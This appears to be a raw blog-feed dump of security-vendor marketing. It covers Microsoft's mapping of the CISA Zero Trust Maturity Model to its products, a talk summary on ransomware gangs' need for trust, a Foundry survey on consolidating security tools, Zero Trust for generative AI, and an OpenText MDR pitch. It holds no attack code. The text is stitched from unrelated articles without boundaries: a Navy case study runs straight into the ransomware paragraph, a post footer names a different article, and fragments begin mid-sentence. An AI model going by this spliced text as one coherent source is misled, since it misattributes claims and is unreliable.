&lt;p&gt;Microsoft has embraced Zero Trust principles—both in the way we secure our own enterprise environment and for our customers. We’ve been helping thousands of organizations worldwide transition to a Zero Trust security model, including many United States government agencies. In this blog, we’ll preview the new guidance and share how it helps United States government agencies and their partners implement their Zero Trust strategies. We’ll also share the Microsoft Zero Trust platform and relevant solutions that help meet CISA’s Zero Trust requirements, and close with two examples of real-world deployments.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="microsoft-supports-cisa-s-zero-trust-maturity-model"&gt;Microsoft supports CISA’s Zero Trust Maturity Model&lt;/h2&gt;



&lt;p&gt;CISA’s Zero Trust Maturity Model provides detailed guidance for organizations to evaluate their current security posture and identify necessary changes for transitioning to more modernized federal cybersecurity.&lt;/p&gt;


&lt;figure class="wp-block-image aligncenter size-full"&gt;&lt;img alt="The five CISA Zero Trust Pillars: Identity, Devices, Networks, Applications &amp;amp; Workloads, and Data, as well as capabilities uniform across all pillars &amp;ndash; including Visibility &amp;amp; analytics, Automation &amp;amp; orchestration, and Governance. " class="wp-image-136889 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/12/Picture1-6.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. CISA Zero Trust Maturity Model.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The CISA Zero Trust Maturity Model includes&amp;nbsp;&lt;strong&gt;five pillars&lt;/strong&gt;&amp;nbsp;that represent protection areas for Zero Trust:&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;&lt;strong&gt;Identity&lt;/strong&gt;: An identity refers to an attribute or set of attributes that uniquely describes an agency user or entity, including non-person entities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Devices&lt;/strong&gt;: A device refers to any asset (including its hardware, software, and firmware) that can connect to a network, including servers, desktop and laptop machines, printers, mobile phones, Internet of Things (IoT) devices, networking equipment, and more.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Networks&lt;/strong&gt;: A network refers to an open communications medium including typical channels such as agency internal networks, wireless networks, and the internet as well as other potential channels such as cellular and application-level channels used to transport messages.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Applications and workloads&lt;/strong&gt;: Applications and workloads include agency systems, computer programs, and services that execute on-premises, on mobile devices, and in cloud environments.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data&lt;/strong&gt;: Data includes all structured and unstructured files and fragments that reside or have resided in federal systems, devices, networks, applications, databases, infrastructure, and backups (including on-premises and virtual environments) as well as the associated metadata.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The model also integrates capabilities that span across all pillars, to enhance cross-function interoperability—including &lt;strong&gt;visibility and analytics, automation and orchestration, and governance&lt;/strong&gt;. The model further includes the four maturity stages of the Zero Trust Maturity Model:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Traditional&lt;/strong&gt;: The starting point for many government organizations, where assessment and identification of gaps helps determine security priorities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Initial&lt;/strong&gt;: Organizations will have begun implementing automation in areas such as attribute assignment, lifecycle management, and initial cross-pillar solutions including integration of external systems, least privilege strategies, and aggregated visibility.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Advanced&lt;/strong&gt;: Organizations have progressed further along the maturity journey including centralized identity management and integrated policy enforcement across all pillars. Organizations build towards enterprise-wide visibility including near real time risk and posture assessments.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Optimal&lt;/strong&gt;: Organizations have fully automated lifecycle management implementing dynamic just-enough access (JEA) with just-in-time (JIT) controls for access to organization resources. Organizations implement continuous monitoring with centralized visibility.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Microsoft’s Zero Trust Maturity Model guidance serves as a reference for&amp;nbsp;&lt;em&gt;how&lt;/em&gt;&amp;nbsp;government organizations should address key aspects of pillar-specific functions for each pillar, across each stage of implementation maturity, using Microsoft cloud services. Microsoft product teams and security architects supporting government organizations worked in close partnership to provide succinct, actionable guidance that aligns with the &lt;a href="https://www.cisa.gov/sites/default/files/2023-04/zero_trust_maturity_model_v2_508.pdf"&gt;CISA Zero Trust Maturity Model&lt;/a&gt; and is organized by pillar, function, and maturity stage, with product guidance including linked references.&lt;/p&gt;



&lt;p&gt;The guidance focuses on features available now (including public preview) in Microsoft commercial clouds. As cybersecurity threats continue to evolve, Microsoft will continue to innovate to meet the needs of our government customers. We’ve already &lt;a href="https://techcommunity.microsoft.com/blog/microsoftsecurityandcompliance/unlock-proactive-defense-microsoft-security-exposure-management-now-generally-av/4303219"&gt;launched more features&lt;/a&gt; aligned to the principles of Zero Trust—including &lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-security-exposure-management"&gt;Microsoft Security Exposure Management&lt;/a&gt; (MSEM) and more. Look for updates and announcements in the Microsoft Security Blog and check Microsoft Learn for &lt;a href="https://aka.ms/ZTforUSGov"&gt;Zero Trust guidance for Government customers&lt;/a&gt; to stay up to date with the latest information.&lt;/p&gt;

&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Diagram displaying Microsoft&amp;rsquo;s Zero Trust Architecture across six pillars: Identities, Devices, Data, Apps, Infrastructure, and Network." class="wp-image-136891 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/12/Picture2-5-1024x534.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. Microsoft Zero Trust Architecture.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Microsoft cloud services that support the five pillars of the CISA Zero Trust Maturity Model include:&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/identity-access/microsoft-entra-id"&gt;&lt;strong&gt;Microsoft Entra ID&lt;/strong&gt;&lt;/a&gt; is an integrated multicloud identity and access management solution and identity provider that helps achieve capabilities in the&amp;nbsp;&lt;strong&gt;&lt;em&gt;identity&lt;/em&gt;&amp;nbsp;pillar&lt;/strong&gt;. It is tightly integrated with Microsoft 365 and Microsoft Defender XDR services to provide a comprehensive suite of Zero Trust capabilities including strict identity verification, enforcing least privilege, and adaptive risk-based access control. Built for cloud-scale, Microsoft Entra ID handles billions of authentications every day. Establishing it as your organization’s Zero Trust identity provider lets you configure, enforce, and monitor adaptive Zero Trust access policies in a single location. Conditional Access is the Zero Trust authorization engine for Microsoft Entra ID, enabling dynamic, adaptive, fine-grained, risk-based, access policies for any workload.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/endpoint-management/microsoft-intune"&gt;&lt;strong&gt;Microsoft Intune&lt;/strong&gt;&lt;/a&gt; is a multiplatform endpoint and application management suite for Windows, MacOS, Linux, iOS, iPadOS, and Android devices. Its configuration policies manage devices and applications.&amp;nbsp;&lt;a href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Microsoft Defender for Endpoint&lt;/a&gt;&amp;nbsp;helps organizations prevent, detect, investigate, and respond to advanced cyberthreats on devices. Microsoft Intune and Defender for Endpoint work together to enforce security policies, assess device health, vulnerability exposure, risk level, and configuration compliance status. Microsoft Intune and Microsoft Defender for Endpoint help achieve capabilities in the&amp;nbsp;&lt;strong&gt;&lt;em&gt;device&lt;/em&gt;&amp;nbsp;pillar&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://docs.github.com/en/get-started/start-your-journey/about-github-and-git" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;GitHub&lt;/strong&gt;&lt;/a&gt; is a cloud-based platform where you can store, share, and work together with others to write code. GitHub Advanced Security includes features that help organizations improve and maintain code by providing code scanning, secret scanning, security checks, and dependency review throughout the deployment pipeline.&amp;nbsp;&lt;a href="https://www.microsoft.com/security/business/identity-access/microsoft-entra-workload-id"&gt;Microsoft Entra Workload ID&lt;/a&gt;&amp;nbsp;helps organizations use continuous integration and continuous delivery (CI/CD) with GitHub Actions. GitHub and Azure DevOps are essential to the&amp;nbsp;&lt;strong&gt;&lt;em&gt;applications and workloads&lt;/em&gt;&amp;nbsp;pillar&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/microsoft-purview"&gt;&lt;strong&gt;Microsoft Purview&lt;/strong&gt;&lt;/a&gt; aligns to the&amp;nbsp;&lt;strong&gt;&lt;em&gt;data&lt;/em&gt;&amp;nbsp;pillar&lt;/strong&gt; activities, with a range of solutions for unified data security, data governance, and risk and compliance management.&amp;nbsp;&lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-information-protection"&gt;Microsoft Purview Information Protection&lt;/a&gt;&amp;nbsp;lets you define and label sensitive information types. Auto-labeling within Microsoft 365 clients ensures data is appropriately labeled and protected.&amp;nbsp;&lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-data-loss-prevention"&gt;Microsoft Purview Data Loss Prevention&lt;/a&gt;&amp;nbsp;integrates with Microsoft 365 services and apps, and Microsoft Defender XDR components to detect and prevent data loss.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/azure/networking/fundamentals/networking-overview" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Azure networking services&lt;/strong&gt;&lt;/a&gt; include a range of software-defined network resources that can be used to provide networking capabilities for connectivity, application protection, application delivery, and network monitoring. Azure networking resources like Microsoft Azure Firewall Premium, Azure DDoS Protection, Microsoft Azure Application Gateway, Azure API Management, Azure Virtual Network, and network security groups, all work together to provide routing, segmentation, and visibility into your network. Azure networking services and network segmentation architectures are essential to the&amp;nbsp;&lt;strong&gt;&lt;em&gt;network&lt;/em&gt;&amp;nbsp;pillar.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-defender-xdr"&gt;&lt;strong&gt;Microsoft Defender XDR&lt;/strong&gt;&lt;/a&gt; plays key roles across multiple pillars, critical to both the&amp;nbsp;&lt;strong&gt;&lt;em&gt;automation and orchestration&lt;/em&gt;&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;&lt;em&gt;visibility and analytics&lt;/em&gt;&amp;nbsp;cross-cutting capabilities&lt;/strong&gt;. It is a unified pre-breach and post-breach enterprise defense suite that natively coordinates detection, prevention, investigation, and response actions. It correlates millions of signals across endpoints, identities, email, and applications to automatically disrupt cyberattacks. Microsoft Defender XDR’s automated investigation and response and Microsoft Sentinel playbooks are used to complete security orchestration, automation, and response (SOAR) activities.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-sentinel"&gt;&lt;strong&gt;Microsoft Sentinel&lt;/strong&gt;&lt;/a&gt; is essential to both&amp;nbsp;&lt;em&gt;&lt;strong&gt;automation and orchestration&lt;/strong&gt;&lt;/em&gt;&amp;nbsp;and&amp;nbsp;&lt;em&gt;&lt;strong&gt;visibility and analytics&lt;/strong&gt;&lt;/em&gt;&amp;nbsp;cross-cutting capabilities, along with any activities requiring SIEM integration. It is a cloud-based security information and event management (SIEM) you deploy in Azure. Microsoft Sentinel operates at cloud scale to accelerate security response and save time by automating common tasks and streamlining investigations with incident insights. Built-in data connectors make it easy to ingest security logs from Microsoft 365, Microsoft Defender XDR, Microsoft Entra ID, Azure, non-Microsoft clouds, and on-premises infrastructure.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="real-world-pilots-and-implementations-utilizing-microsoft-guidance"&gt;Real-world pilots and implementations utilizing Microsoft guidance&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;The United States Department of Agriculture (USDA) implements multifaceted solution for phishing-resistance initiative&lt;/strong&gt;—In this customer story, the USDA implements phishing-resistant multifactor authentication (MFA)—which is important aspect of the identity pillar of the CISA Zero Trust Maturity Model. By selecting Microsoft Entra ID, the USDA was able to scale these capabilities to enforce phishing-resistant authentication with Microsoft Entra Conditional Access for their four main enterprise services—Windows desktop logon, Microsoft M365, VPN, single sign-on (SSO). By integrating their centralized WebSSO platform with Microsoft Entra ID and piloting more than 600 internal applications, the USDA incrementally and rapidly deployed the capability to support the applications and services relevant to most users.

&lt;p&gt;&lt;strong&gt;The United States Navy collaborates with Microsoft on CISA Zero Trust implementation&lt;/strong&gt;—In this customer story, the United States Navy was able to utilize Zero Trust activity-level guidance to meet or exceed the Department of Defense (DoD) Zero Trust requirements with Microsoft Cloud services. And now with Microsoft guidance tailored for the United States government agencies, the aim is to help civilian agencies and their industry partners to do the same—meeting the CISA ZTMM recommendations at each maturity stage with Microsoft Cloud services. Together with Microsoft, the Navy developed an integrated model of security to help meet their ZT implementation goals.

In contrast to most other threat actors, ransomware operators rely on and leverage public visibility into their activities. Unlike APTs and other threat actors that prize stealth, ransomware gangs seek to publicize their attacks in order to convince future victims that they are trustworthy enough to deliver on their promises &amp;#8211; providing a decryptor and deleting stolen data &amp;#8211; if paid.&lt;/p&gt;
&lt;p&gt;In &amp;#8216;The Ransomware Trust Paradox&amp;#8217;, Max observes that this notion of trust is not only a prerequisite for ransomware gangs&amp;#8217; profitability but also relies on media and security vendor reporting. Detailing the mechanisms by which ransomware operators establish trust, build brand awareness, and foster a reputation for reliability, this talk is essential viewing for anyone reporting on crimeware activities.&lt;/p&gt;
&lt;p&gt;Max calls for the establishment of a reporting code of ethics for threat intelligence and the media, and a shift in policy to undermine the trust dynamics between threat actors and their victims.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/12/18/foundry-study-highlights-the-benefits-of-a-unified-security-platform-in-new-e-book/"&gt;Foundry study highlights the benefits of a unified security platform in new e-book&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Microsoft observes more than 600 million ransomware, phishing, and identity attacks each day.¹ One major theme from our analysis of these attacks is clear—organizations with integrated tools have better visibility and more holistic defense than those using a broader portfolio of point solutions. Microsoft wanted to test this observation outside of its own telemetry, hiring Foundry to conduct a survey of senior-level IT decision makers with a primary role in security management at organizations with 500 or more employees to see what they’re experiencing.&lt;/p&gt;



&lt;p&gt;The results are in, and they might be surprising. Of the study’s 156 respondents, those whose companies have implemented greater quantities of security solutions are experiencing a higher average number of security incidents—15.3 incidents versus 10.5 incidents for organizations with fewer security tools. That’s more than &lt;strong&gt;a 31% increase in self-reported incidents&lt;/strong&gt;. You can read up on the full results in the e-book &lt;a href="https://info.microsoft.com/ww-landing-foundry-a-unified-security-platform.html" rel="noreferrer noopener" target="_blank"&gt;The unified security platform era is here&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;This reinforces the observations Microsoft made based on its own telemetry. The security teams we see that prioritize deploying a diverse portfolio of “category leaders” often have overlapping policies and controls that create weak points. The silos created by separate solutions also make it hard to coordinate an effective defense before breaches happen, uncover the true scope of incidents, or to respond quickly.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="why-consolidated-security-wins"&gt;Why consolidated security wins&lt;/h2&gt;



&lt;p&gt;The initial stages of cyberattacks remain fairly consistent year over year—with brute force identity attacks, phishing and social engineering, and internet-exposed vulnerabilities continuing to be the most common. Threat actors are still largely using opportunity-based tactics for these first few steps. It’s only once someone’s credentials are obtained by bad actors that they begin taking more targeted action against a company’s infrastructure. When they do this, the would-be cyberattackers often conduct significant reconnaissance, demonstrating a tremendous understanding of the enterprise environment by targeting the seams between security solutions and taking advantage of technical debt. Examples of this could include a test app from an untracked satellite tenant that doesn’t enforce &lt;a href="https://www.microsoft.com/security/business/identity-access/microsoft-entra-mfa-multi-factor-authentication"&gt;multifactor authentication&lt;/a&gt;, devices infected with malware, or legacy authentication protocols.&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Graphs showing that on average, enterprises use around 14 different security tools. Forty seven percent of enterprises noted the number of security tools their organizations have adopted in the past year has remained the same, with thirty five percent of enterprises noting an increase in the number of security tools adopted in the past year, and eighteen percent noting a decrease in the number of security tools their organizations have adopted in the past year." class="wp-image-136914 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/12/Picture1-7-1024x543.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;Diverse tool portfolios are very likely to lack the integration and signal sharing required to help security teams to understand how, or even if, cyberattackers are exploiting their infrastructure. As a result, cyberattackers have more seams they can exploit, they can remain undetected longer, and security teams will have a harder time ensuring they’ve fully removed the attackers’ access.&lt;/p&gt;



&lt;p&gt;While there will never be a single comprehensive security tool, organizations that streamline their security stacks by adopting a security platform that integrates controls, policies, and signals will have a more resilient and comprehensively protected environment that can respond to cyberthreats more effectively. The research done by Foundry and Microsoft shows how this unified security approach helps security teams act more efficiently, reduce core metrics like mean time to repair and mean time to acknowledge, and improve their overall security posture. By eliminating many of the potential seams between standalone solutions, these companies were able to prevent, detect, and respond to many more security threats as they emerged.&lt;/p&gt;



&lt;p&gt;A streamlined, unified security approach like the &lt;a href="https://aka.ms/DefendAgainstThreatsSolution"&gt;Microsoft unified security operations platform&lt;/a&gt;, which provides its users with a consistent data model and reduced silos, can also generate better results from automation and AI—both of which are powerful tools that help security operations (SecOps) teams close critical security gaps through improved exposure management, resiliency, and incident detection and response. Equally, SecOps teams that gain a single, centralized, and contextualized view of their company’s cyberthreat exposure are better able to measure and improve their security posture. By gaining the visibility and tools to conduct this kind of exposure management, these teams are able to shift from traditional, reactive detection and response-based security postures to more proactive postures that prioritize exposure-mitigating actions across devices, identities, applications, data, and their multicloud infrastructure.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="unified-security-means-fewer-cyberattacks-and-improved-posture"&gt;Unified security means fewer cyberattacks and improved posture&lt;/h2&gt;



&lt;p&gt;The two biggest reported challenges facing respondents who were looking to improve their security posture were the complexity of their current environment and poor visibility across their security landscape. In fact, these challenges have become so universally apparent to the Foundry study’s survey participants that &lt;strong&gt;91% &lt;/strong&gt;of respondents operating a best-of-breed security approach are prioritizing vendor consolidation in the next 12 months. The same is true of 79% of respondents using 10 or more security tools. This strategy helps shift toward a more proactive security posture, and the Foundry study shows that it can also have a dramatically positive effect on the average number of security incidents a company faces. &amp;nbsp;&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Bar chart showing the biggest challenges to achieving a successful security posture." class="wp-image-136915 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/12/Picture2-6-1024x773.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;As 2024 has shown, keeping software up to date and installing strong security measures isn’t enough. It is nearly impossible for any organization to “out-patch” threat actors. Everyone needs to shift away from working through lists of vulnerabilities and to focus more on thinking like a cyberattacker—viewing vulnerabilities not as a list, but as elements that could be chained together to breach our environments in order to reach critical assets.&lt;/p&gt;



&lt;p&gt;This is made much more difficult when using a diverse array of security vendors for each of your main security domains. Gaining visibility into possible attack paths, prioritizing based on potential incident severity, and then confidently removing the vulnerabilities is all made vastly more difficult when the work needs to be done manually across dozens of silos.&lt;/p&gt;



&lt;p&gt;A unified platform changes how risk exposure can be handled. For example, security teams can use attack paths to remove vulnerabilities as if they’re responding to security incidents—with a prioritized list, systematically addressed based on variables like sensitivity of data, importance of critical assets, and severity of exposure. And with the native integrations of a platform, this value can be extended beyond just managing vulnerabilities. If you’re investigating a new incident and you’re shown that one of the compromised entities could lead to critical assets, that context could make the difference between routine remediation and a board-level briefing.&lt;/p&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="setting-out-on-your-unified-security-platform-journey"&gt;Setting out on your unified security platform journey&lt;/h2&gt;



&lt;p&gt;Reducing and consolidating security tools around a unified security platform is no small feat, either technologically or culturally. To get started, target a few small but key areas. This will give your security operations center (SOC) team a few quick wins and prove the value of consolidation to you and your stakeholders. You&amp;#8217;ll also be able to customize and refine your new environment, ensuring necessary integrations are in place for end-to-end visibility without disrupting operations. You may also want to focus on change management early on, reskilling team members in a way that provides ample time for them to ramp up before going live.&lt;/p&gt;



&lt;p&gt;Moving to a unified security platform is not just about improving defenses, so don&amp;#8217;t forget to lend some of your time to maintaining positive employee experiences. Reducing friction across endpoint devices, apps, identities, and networks will make it easier for employees to access the systems and data they need. It also reduces the chance that employees will try to bypass new security policies in the interest of maintaining learned behaviors.

&lt;h2 class="wp-block-heading" id="navigating-ai-s-unique-challenges"&gt;Navigating AI’s unique challenges &amp;nbsp;&lt;/h2&gt;



&lt;p&gt;AI presents new types of problems that require different thinking and different solutions.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="generative-ai-is-dynamic"&gt;Generative AI is dynamic&lt;/h3&gt;



&lt;p&gt;At the most fundamental level, generative AI is non-deterministic computing, which means that it doesn’t provide the exact same output each time you run it. For example, asking an image generation model to “draw a picture of a kitten in a security guard uniform” repeatedly is unlikely to generate the exact same picture twice (though they will all be similar). Static security controls assume that vulnerabilities (in the broader definition) and their exploitation so they will look exactly the same each time will not be particularly effective at detecting and blocking attacks on AI. You need controls made for AI. &lt;/p&gt;



&lt;h3 class="wp-block-heading" id="generative-ai-is-data-centric"&gt;Generative AI is data-centric&lt;/h3&gt;



&lt;p&gt;Generative AI is fundamentally a data analysis and data generation technology, making the security and governance of your data incredibly important to the security of your AI applications and the reliability and trustworthiness of their outputs.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;You need to have an asset-centric and data-centric security approach that can handle dynamic changes to secure AI and the data it relies on. &lt;strong&gt;This means you need a Zero Trust approach to effectively secure AI&lt;/strong&gt;.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/en-us/security/business/zero-trust"&gt;Zero Trust&lt;/a&gt; is simply modern security without the false assumption that a network security perimeter is enough to secure assets in it (including data). This drives a mindset shift that changes how you look at security strategy, architecture, controls, and more. Zero Trust focuses security protecting business assets inside and outside the classic network perimeter across the ‘hybrid of everything’ environments (including multiplatform, multicloud, on-premises, operational technology, Internet of Things, and more). &lt;/p&gt;



&lt;h3 class="wp-block-heading" id="cyberattackers-are-using-generative-ai-against-you"&gt;Cyberattackers are using generative AI against you&lt;/h3&gt;



&lt;p&gt;Another complication is that AI relies on vast amounts of data to train models, making your data a prime target for cyberattackers and elevating the importance of protecting your data. Cybercriminals are also using AI now to refine attack techniques and process the data they steal from organizations. Organizations must recognize that these threats are already happening and urgently adapt their security strategies to effectively protect their data, AI applications, business assets, and people.  &lt;/p&gt;



&lt;p&gt;By applying Zero Trust principles, organizations can reduce the risk related to AI while rapidly embracing the opportunities that this technology offers.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="key-strategies-to-help-manage-ai-security-risks"&gt;Key strategies to help manage AI security risks &amp;nbsp;&lt;/h2&gt;



&lt;p&gt;These strategies from the whitepaper illustrate how to manage the risks associated with AI.  &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Provide guidance to users&lt;/strong&gt;. Cyberattackers are using AI to improve the quality and volume of scam emails and phone calls (sometimes called phishing or business email compromise) that will be experienced by nearly anyone in the organization. Organizations must urgently start educating everyone (starting with financial roles and other high-business-impacting roles) so that they understand that they are likely to see these highly convincing fake communications and what to do about it. People will need to understand the basics of how AI works, the risks that it poses, and what they can do about it (such as how to spot it, how to report it to security teams, or how to enhance business processes to independently verify important transactions). &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Protect AI applications and data&lt;/strong&gt;.&lt;strong&gt; &lt;/strong&gt;Cybercriminals are actively targeting AI systems. Early integration of security in AI development is crucial to avoid costly fixes later.&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Adopt AI security capabilities&lt;/strong&gt;. While AI is not a magical silver bullet that can replace talented human experts and existing tools, AI technology can significantly enhance security operations (SecOps) by empowering people to get more out of their data and tools (quickly writing up reports, analyzing business impact of attacks, guiding newer analysts through investigation, and more).&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Policy and standards&lt;/strong&gt;.&lt;strong&gt; &lt;/strong&gt;Organizations need written security standards and processes to guide their team’s decisions and demonstrate they are following due diligence to regulators. These standards should cover security, privacy, and ethical considerations—you can use &lt;a href="https://blogs.microsoft.com/on-the-issues/2022/06/21/microsofts-framework-for-building-ai-systems-responsibly/" rel="noreferrer noopener" target="_blank"&gt;Microsoft’s Responsible AI Standard&lt;/a&gt; as a reference to guide this work.&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram showing multiple dimensions of AI security risk." class="wp-image-136883 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/12/AI-Imperatives.webp" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="zero-trust-and-ai-a-symbiotic-relationship"&gt; Zero Trust and AI: A symbiotic relationship &lt;/h2&gt;



&lt;p&gt;We have found that there is a symbiotic relationship between Zero Trust and Generative AI where: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;AI requires a Zero Trust approach to effectively protect data and AI applications.&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;AI-powered capabilities can help accelerate Zero Trust by analyzing vast data signals, extracting key insights, guiding humans through key processes, and automating repetitive manual tasks. This allows your teams to cut through the noise, responding to threats faster, and continuously learn and grow their expertise.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The Zero Trust approach to security helps you keep up with continuously changing threats as well as the rapid evolution of technology that AI represents. I will wrap this blog with a quote from the &lt;a href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/final/en-us/microsoft-product-and-services/microsoft-dynamics-365/pdf/367541-ai-and-zero-trust-roadmap-final.pdf?culture=en-us&amp;amp;country=us" rel="noreferrer noopener" target="_blank"&gt;new whitepaper&lt;/a&gt;:&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;&amp;#8220;By integrating security early and embracing Zero Trust principles, organizations can take advantage of AI while mitigating risks, much like brakes on a car enable people to safely travel faster.&amp;#8221;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

At the same time, MSPs face the challenge of balancing customer satisfaction with profitability, making strategic decisions more important than ever. For 35% of MSPs, building cyber resiliency for customers is a top strategic priority, but that goal often runs up against resource constraints and rising operational costs.&lt;a href="https://www.webroot.com/blog/feed/#_edn1" id="_ednref1"&gt;[i]&lt;/a&gt; To stay competitive, MSPs are focusing on improving operational efficiency (35%) and keeping costs under control (33%).&lt;a href="https://www.webroot.com/blog/feed/#_edn2" id="_ednref2"&gt;[ii]&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;One of the smartest ways to tackle these strategic goals is by partnering with OpenText to deliver managed detection and response (MDR) services. This partnership empowers MSPs to offer a cutting-edge, fully managed detection and response service, taking the weight off operational costs and simplifying the complexity of building and managing an in-house MDR solution.&lt;/p&gt;



&lt;p&gt;Here are five ways OpenText MDR helps MSPs overcome their biggest challenges:&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Filling the security staff resource and skills gap&lt;/h2&gt;



&lt;p&gt;Staffing can be a perpetual challenge for MSPs, particularly when it comes to hiring and retaining skilled cybersecurity professionals. With a global shortage of 4.8 million cybersecurity experts, this issue is only becoming more pressing. MSPs feel the strain in several key areas, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Managing an overwhelming volume of alerts with a limited team&lt;/li&gt;



&lt;li&gt;Cultivating the advanced skills needed to thoroughly investigate and prioritize threats&lt;/li&gt;



&lt;li&gt;Attracting and retaining top security talent to close skills gaps and support business growth&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;OpenText MDR tackles this challenge for MSPs head-on by providing you with a fully managed or co-managed MDR partnership. With OpenText MDR, MSPs can access 24/7/365 security expertise and continuous threat monitoring without the cost or complexity of building an in-house SOC. This not only eases the pressure on your internal teams but ensures a high-level of security coverage for your customers at all times.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;2. Streamlining alert management&lt;/h2&gt;



&lt;p&gt;Detecting advanced threats requires a sophisticated approach to monitoring a customer&amp;#8217;s attack surface. This is where SIEMs come in—essential for correlating data and identifying threats. However, SIEMs can be complex to configure, manage, and tune, which can lead to a high volume of false positives. For MSPs with limited resources, this flood of irrelevant alerts can overwhelm teams and drain operational efficiency.&lt;/p&gt;



&lt;p&gt;OpenText MDR solves this by leveraging advanced threat intelligence to correlate security logs and reduce false positives, all while managing the SIEM and monitoring alerts for you. By continuously prioritizing critical threats, our experts handle the complexity of alert management, allowing MSPs to focus on what matters most—securing their customers—without the burden of filtering through a flood of false alarms.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;3. Accelerating incident response&lt;/h2&gt;



&lt;p&gt;With a flood of alerts constantly coming in and the need to pivot between multiple consoles to investigate, MSP security teams often struggle with slow, time-consuming incident response. The pressure to act quickly is high, as swift action is essential to prevent the disastrous outcomes of a breach. However, many teams find themselves bogged down, bouncing between disparate tools and struggling to identify and respond to threats in real-time.&lt;/p&gt;



&lt;p&gt;OpenText MDR addresses this challenge with fast, proactive monitoring and continuous threat hunting to detect suspicious activity early. Our dedicated experts streamline incident response by quickly identifying threats and escalating them within 15 minutes, ensuring MSPs can act fast and minimize the impact of potential breaches.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;4. Simplifying security management across complex environments&lt;/h2&gt;



